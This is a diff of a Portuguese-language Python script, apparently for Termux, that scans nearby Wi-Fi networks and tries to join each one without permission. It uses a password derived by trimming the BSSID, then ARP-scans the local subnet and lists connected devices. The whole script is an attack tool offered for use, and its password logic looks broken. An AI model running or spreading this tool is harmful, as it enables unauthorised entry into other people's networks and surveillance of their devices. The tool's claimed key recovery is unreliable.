@@ -1,7 +1,7 @@
-import time
+import subprocess
 import pywifi
 from scapy.all import ARP, Ether, srp
-import subprocess
+import time
 
 def verificar_e_instalar_dependencias():
     try:
@@ -13,10 +13,13 @@ def verificar_e_instalar_dependencias():
 
 def instalar_dependencias():
     try:
+        subprocess.run(["pkg", "install", "python"], check=True)
+        subprocess.run(["pkg", "install", "clang"], check=True)
+        subprocess.run(["pkg", "install", "libxml2", "libxml2-dev", "libxslt", "libxslt-dev"], check=True)
         subprocess.run(["pip", "install", "pywifi", "scapy"], check=True)
         print("As dependências 'pywifi' e 'scapy' foram instaladas com sucesso.")
     except subprocess.CalledProcessError:
-        print("Erro ao instalar as dependências 'pywifi' e 'scapy'. Certifique-se de que o pip está instalado e tente novamente.")
+        print("Erro ao instalar as dependências 'pywifi' e 'scapy'. Certifique-se de que o Termux está corretamente configurado e tente novamente.")
 
 def obter_dispositivos_conectados():
     arp = ARP(pdst="192.168.0.1/24")
@@ -37,48 +40,51 @@ def calcular_senha(bssid):
     bssid = bssid[2:]
     return bssid
 
-verificar_e_instalar_dependencias()
+def executar_script_wifi_termux():
+    verificar_e_instalar_dependencias()
 
-wifi = pywifi.PyWiFi()
-iface = wifi.interfaces()[0]
-iface.enable()
+    wifi = pywifi.PyWiFi()
+    iface = wifi.interfaces()[0]
+    iface.enable()
 
-networks = []
-
-while True:
-    # Obter as redes Wi-Fi disponíveis
-    iface.scan()
-    time.sleep(5)  # Tempo para o escaneamento das redes
-
-    # Limpar a lista de redes existentes
     networks = []
 
-    # Atualizar a lista de redes disponíveis
-    scan_results = iface.scan_results()
-    for network in scan_results:
-        if network not in networks:
-            networks.append(network)
+    while True:
+        # Obter as redes Wi-Fi disponíveis
+        iface.scan()
+        time.sleep(5)  # Tempo para o escaneamento das redes
 
-    for network in networks:
-        senha_wifi = calcular_senha(network.bssid)
+        # Limpar a lista de redes existentes
+        networks = []
 
-        perfil = pywifi.Profile()
-        perfil.ssid = network.ssid
-        perfil.auth = pywifi.const.AUTH_ALG_OPEN
-        perfil.akm.append(pywifi.const.AKM_TYPE_WPA2PSK)
-        perfil.cipher = pywifi.const.CIPHER_TYPE_CCMP
-        perfil.key = senha_wifi
+        # Atualizar a lista de redes disponíveis
+        scan_results = iface.scan_results()
+        for network in scan_results:
+            if network not in networks:
+                networks.append(network)
 
-        iface.remove_all_network_profiles()
-        temp_profile = iface.add_network_profile(perfil)
-        iface.connect(temp_profile)
+        for network in networks:
+            senha_wifi = calcular_senha(network.bssid)
 
-        print(f"Conectado à rede Wi-Fi: {network.ssid} - BSSID: {network.bssid} - Senha: {senha_wifi}")
+            perfil = pywifi.Profile()
+            perfil.ssid = network.ssid
+            perfil.auth = pywifi.const.AUTH_ALG_OPEN
+            perfil.akm.append(pywifi.const.AKM_TYPE_WPA2PSK)
+            perfil.cipher = pywifi.const.CIPHER_TYPE_CCMP
+            perfil.key = senha_wifi
 
-    time.sleep(60)  # Aguardar 1 minuto antes de atualizar novamente
+            iface.remove_all_network_profiles()
+            temp_profile = iface.add_network_profile(perfil)
+            iface.connect(temp_profile)
 
-    dispositivos_conectados = obter_dispositivos_conectados()
+            print(f"Conectado à rede Wi-Fi: {network.ssid} - BSSID: {network.bssid} - Senha: {senha_wifi}")
 
-    print("\nDispositivos conectados na rede:")
-    for dispositivo in dispositivos_conectados:
-        print(f"IP: {dispositivo['IP']} - MAC: {dispositivo['MAC']}")
+        time.sleep(60)  # Aguardar 1 minuto antes de atualizar novamente
+
+        dispositivos_conectados = obter_dispositivos_conectados()
+
+        print("\nDispositivos conectados na rede:")
+        for dispositivo in dispositivos_conectados:
+            print(f"IP: {dispositivo['IP']} - MAC: {dispositivo['MAC']}")
+
+executar_script_wifi_termux()
